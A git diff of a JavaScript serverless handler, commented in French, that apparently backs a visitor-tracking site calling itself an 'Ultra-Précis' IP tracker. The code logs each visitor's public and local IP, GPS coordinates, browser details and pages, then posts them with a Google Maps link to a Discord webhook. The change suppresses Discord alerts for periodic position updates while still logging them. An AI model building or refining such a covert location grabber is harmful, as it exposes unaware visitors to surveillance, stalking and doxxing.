@@ -22,7 +22,7 @@ export default async function handler(req, res) {
     console.error("Erreur géo:", e);
   }
 
-  const { sessionId, localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
+  const { sessionId, isUpdate, localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
 
   let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
   
@@ -46,6 +46,7 @@ export default async function handler(req, res) {
 
   const logEntry = {
     sessionId: sessionId || 'unknown',
+    isUpdate: !!isUpdate,
     timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
     publicIp,
     localIp,
@@ -62,14 +63,12 @@ export default async function handler(req, res) {
 
   console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));
 
-  // Envoi vers Discord (uniquement pour le premier log ou si mouvement significatif ?)
-  // Pour éviter le spam, on pourrait limiter l'envoi Discord, mais gardons-le pour l'instant
+  // Envoi vers Discord (UNIQUEMENT si ce n'est PAS une mise à jour périodique)
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
-  if (webhookUrl) {
+  if (webhookUrl && !logEntry.isUpdate) {
     const cleanCoords = logEntry.coords.replace(/\s/g, '');
     const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
-    const isUpdate = sessionId && sessionId !== 'unknown'; // Simple check
     
     const locValue = logEntry.isPrecise 
       ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
@@ -97,7 +96,7 @@ export default async function handler(req, res) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
-            title: isUpdate ? "🔄 Mise à jour de Position !" : "🚀 Nouvelle Visite sur le Site !",
+            title: "🚀 Nouvelle Visite sur le Site !",
             color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
             fields: fields,
             footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
